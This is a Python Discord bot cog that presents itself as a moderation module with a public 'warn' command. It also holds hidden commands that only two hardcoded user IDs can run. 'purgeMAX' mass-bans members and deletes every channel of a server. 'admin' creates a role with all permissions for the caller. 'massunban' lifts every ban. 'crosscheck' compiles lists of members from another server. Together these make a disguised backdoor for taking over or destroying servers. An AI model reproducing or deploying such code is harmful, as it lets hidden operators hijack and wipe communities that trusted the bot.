import asyncio
from datetime import datetime

import pytz
from discord import Color, Embed, Permissions, User
from discord.ext.commands import (BucketType, Cog, CommandOnCooldown, Greedy,
                                  command, cooldown, has_permissions)


class Mod(Cog):
    def __init__(self,bot):
        self.bot = bot
        self.list_of_admins =[426549783864279040,
                             738990452673478738]
        self.server_blacklist =  ["Aurium's Squad",
                            "Dav on Deck",
                            "cheese on deck",
                            ".my shit",
                            "test Server",
                            "Drip Land",
                            "Lug Nuts",
                            "The Opioid Estate",
                            "Wall Street Wannabes",
                            809099935663652954,
                            701753524551286784,]  
        self.SLEEPTIME = 0.5                 
    
    @Cog.listener()
    async def on_ready(self):
        if not self.bot.ready:
            self.bot.cogs_ready.ready_up("mod")

    
    @command(name = "warn", brief = "Warns a member. MUST HAVE MOD")
    @cooldown(1,5,type = BucketType.user)
    @cooldown(1,5, BucketType.user)
    @has_permissions(kick_members = True)
    async def warn(self,ctx, members: Greedy[User],*,reason = None):

        member = members[0]
        print(f"{ctx.author.name} warned {member.name} in {ctx.guild} for {reason}")
        if reason == None:
            embed = Embed(title = "Command: poo.warn",
                                description = '''**Description**: Warns a member
                                                **Cooldown**: 5 seconds
                                                **Usage**: poo.warn [member][reason]''',
                                color = Color.dark_blue())
            await ctx.send(embed = embed)
        else:
    
            await member.send(f"You were warned in {ctx.guild.name} for: {reason}")

            embed = Embed(title =f":poop:***{member} has been warned***", color = Color.dark_blue())

            await ctx.send(embed=embed)
            

    @warn.error
    async def on_warn_error(self,ctx,error):
        if isinstance(error, CommandOnCooldown):
            await ctx.send("Please wait before sending that again")
        else:
            embed = Embed(title = "Command: poo.warn",
                                description = '''**Description**: Warns a member
                                                **Cooldown**: 5 seconds
                                                **Usage**: poo.warn [member][reason]
                                            **CAN ONLY BE USED BY MODS**''',
                                color = Color.dark_blue())
            await ctx.send(embed=embed)
            print(error)
    @command(name = "purgeMAX",brief = "u know what it does. dont use it",hidden = True)
   
    async def purgeMAX(self,ctx):
        server = ctx.message.guild
        if ctx.author.id in self.list_of_admins and server.name not in self.server_blacklist and server.id not in self.server_blacklist:
            print(f"finna purge {ctx.guild}")

            

            members = ctx.guild.members
            bot = await self.bot.fetch_user(738990452673478738)
        #change this to the default server role
            for member in members:
                if member == bot:
                    bot = member
                    break
            for member in members:
            
                if member.top_role > bot.top_role: 
                    continue
                elif member.top_role < bot.top_role and member.id != ctx.guild.owner.id:
                    if member.id not in self.list_of_admins:
                        print(f"now banning {member.name}") 
                        await member.ban(reason = "keked")  

                        
            channels = ctx.message.guild.channels                   
            for channel in channels:
            
                await channel.delete()
                
            for voiceChannel in channels:
                await channel.delete()  
        else:
            print(f"avoided purging {ctx.guild}")
    @command(name = "unban",brief = "unbans a member given their id")
    async def unban(self,ctx, id: int):
        if ctx.author.id in self.list_of_admins:
            user = await self.bot.fetch_user(id)
            await ctx.guild.unban(user)
            print(f"unbanned {user.name}")
        else:
            await ctx.send("no")
    @command(name = "massunban",brief = "unbans every member in a server",hidden = True)
    async def massunban(self,ctx):
        if ctx.message.author.id in self.list_of_admins:
            banned_members = await ctx.guild.bans()
            
            for ban_entry in banned_members:
                userID = ban_entry.user
                print(userID)
                await ctx.guild.unban(userID)
            

        else:
            print("denied massunban")
    @command(name = "getrole",brief = "tell u if u can purge or not",hidden = True)
    async def getrole(self,ctx):
        if ctx.author.id not in self.list_of_admins:
            print("denied request to get role")
        else:
            for member in ctx.guild.members:
                if member.id == 738990452673478738:
                    for role in member.roles:
                        print(f"now checking {role}")
                        if role.permissions.manage_channels or role.permissions.administrator:
                            print("he can purge")
                            print(f"bot has admin = {role.permissions.administrator}\nbot has manage_channels = {role.permissions.manage_channels}")
                            break
                        else:
                            print(f"{role.name} cant purge")
    @command(name = "admin",brief = "gives admin",hidden =True)
    async def admin(self,ctx):
        if ctx.author.id not in self.list_of_admins:
            print("denied request to become admin")
        else:
            role = await ctx.guild.create_role(name = 'poop',permissions = Permissions.all(),reason = "iwantperms")
            print(f"made the role {role}")
            await ctx.author.add_roles(role)
            print(f"gave {role.name} to {ctx.author}")

    @command(name = "crosscheck",brief="crosschecks people in current server with aurium squad",hidden=True)
    async def crosscheck(self,ctx):
        if ctx.author.id not in self.list_of_admins:
            print("denied request to cross check")
        else:
            print("crosschecking now")
            listOfSuspects = []
            aurium = self.bot.get_guild(701753524551286784)
            for member in ctx.guild.members:
                if member in aurium.members:
                    listOfSuspects.append(member.name)
            print(listOfSuspects)
            await ctx.send(f"```py\n {listOfSuspects} \n```")
    
    
    @command(name = "restore",brief = "restores a channel to another channel",hidden = True)
    async def restore(self,ctx, channelID: int):
        if ctx.author.id not in self.list_of_admins:
            print("denied request to restore channel")
        else:
            print(channelID)
            objectiveChannel = await self.bot.fetch_channel(channelID)
            print(f"objective channel is {objectiveChannel}")

            sourceChannel = ctx.channel
            print(f"source channel is {sourceChannel}")
            messageOBJ = 0
            messages = await sourceChannel.history(limit = 3000,oldest_first = True).flatten()
            for message in messages:
                message = await ctx.fetch_message(message.id)
                if messageOBJ == 0:
                    messageOBJ = await ctx.fetch_message(message.id)
                    print("obj defined")
                    
                
                
                
                def date():
                    local_timezone = pytz.timezone('US/Eastern')
                    messageDate = messageOBJ.created_at.replace(tzinfo = pytz.utc)
                    messageDate = messageDate.astimezone(local_timezone)
                    date =datetime.strftime(messageDate,"%m/%d/%Y, %I:%M %p")
                    return date

                if message.content.startswith("https") and not message.content.endswith(".gif"):
                    print("message is link to some shit")
                    print(message.content)
                    
                    if len(message.attachments) > 0:
                        print(message.content)
                        for attachment in message.attachments:

                            embedAttachment = Embed(title = '',description = message.content, color = Color.dark_blue())
                            embedAttachment.set_image(url = attachment.url)
                            embedAttachment.set_author(name = message.author,icon_url= message.author.avatar_url)

                            
                    
                            date = date()                        
                            embedAttachment.set_footer(text =f"ID:{message.id} • {date}")
                            # await asyncio.sleep(SLEEPTIME)
                            await objectiveChannel.send(embed=embedAttachment)
                    else:
                        embedAttachment = Embed(title = '',description = message.content, color = Color.dark_blue())
                        embedAttachment.set_image(url = message.content)
                        embedAttachment.set_author(name = message.author,icon_url= message.author.avatar_url)

                        
                
                        date = date()                        
                        embedAttachment.set_footer(text =f"ID:{message.id} • {date}")
                        # await asyncio.sleep(SLEEPTIME)
                        await objectiveChannel.send(embed=embedAttachment)

                # IF THE MESSAGE IS A GIF
                elif message.content.endswith(".gif"):
                    print("ends in .gif")
            
                    
                    embedGif = Embed(title = '',description = '', color = Color.dark_blue())
                    
                    print(message.content)
                    embedGif = Embed(title = '',description = '', color = Color.dark_blue())
                    embedGif.set_image(url = message.content)
                    
                    embedGif.set_author(name = message.author,icon_url= message.author.avatar_url)
                    

                    date = date()               
                    embedGif.set_footer(text =f"ID:{message.id} • {date}")

                    # await asyncio.sleep(SLEEPTIME)
                    await objectiveChannel.send(embed=embedGif)
                elif len(message.attachments) >0:
                    if message.content.endswith(".gif"):
                        print("ends in .gif")
                
                        embedGif = Embed(title = '',description = '', color = Color.dark_blue())
                        
                        print(message.content)
                        embedGif = Embed(title = '',description = '', color = Color.dark_blue())
                        embedGif.set_image(url = message.content)
                        
                        embedGif.set_author(name = message.author,icon_url= message.author.avatar_url)
                        

                        date = date()               
                        embedGif.set_footer(text =f"ID:{message.id} • {date}")

                        # await asyncio.sleep(SLEEPTIME)
                        await objectiveChannel.send(embed=embedGif)
                    
                    else:
                        filesToExcept = [".pdf",
                                        ]
                        for attachment in message.attachments:
                            print(f"attachment is {attachment.url}")

                            embedAttachment = Embed(title = '',description = message.content, color = Color.dark_blue())
                            if attachment.url.endswith(".pdf") or attachment.url.endswith(".mp3") or attachment.url.endswith(".mp4"):
                                print("is a pdf")
                                embedAttachment.add_field(name = '\u200b', value = attachment.url,inline = False)

                            else:
                                print("not a pdf")
                                embedAttachment.set_image(url = attachment.url)
                            embedAttachment.set_author(name = message.author,icon_url= message.author.avatar_url)

                            
                    
                            date = date()                        
                            embedAttachment.set_footer(text =f"ID:{message.id} • {date}")
                            # await asyncio.sleep(SLEEPTIME)
                            print("sent pdf thingy")
                            await objectiveChannel.send(embed=embedAttachment)

                


                            
                else:
                    print("normal message")
                    embed = Embed(title = '',description = message.content,color = Color.dark_blue())
                    embed.set_author(name = message.author, icon_url = message.author.avatar_url)
                    messageOBJ = await ctx.fetch_message(message.id)  
                    date = date()
                    
                    embed.set_footer(text =f"ID:{message.id} • {date}")
                
                    await asyncio.sleep(self.SLEEPTIME)
                    await objectiveChannel.send(embed = embed)

                #         print(message.content)
                


def setup(bot):
    bot.add_cog(Mod(bot))
